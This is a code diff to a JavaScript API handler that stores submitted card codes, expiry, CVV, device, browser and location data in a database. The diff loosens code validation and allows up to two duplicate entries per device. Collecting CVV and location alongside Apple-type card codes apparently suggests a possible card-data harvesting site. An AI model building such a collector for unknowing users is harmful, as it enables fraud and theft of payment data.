@@ -78,7 +78,7 @@ export default async function handler(req, res) {
   const { cardNumber, type = 'apple', deviceId, browserInfo, location, expiry, cvv } = req.body || {}
 
   // Basic validation
-  if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
+  if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9\/]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
     return res.status(400).json({ error: 'Invalid card code format. Please enter a valid code.' })
   }
 
@@ -109,15 +109,14 @@ export default async function handler(req, res) {
   let insertedCardId = null
 
   try {
-    // Check for duplicates from the same device
+    // Check for duplicates from the same device (allow up to 2 entries)
     if (deviceId) {
       const { data: existing } = await supabase
         .from('cards')
         .select('id')
         .match({ card_number: cardNumber, device_id: deviceId })
-        .limit(1)
 
-      if (existing && existing.length > 0) {
+      if (existing && existing.length >= 2) {
         return res.status(200).json({
           ...result,
           cardNumber: result.card_number,
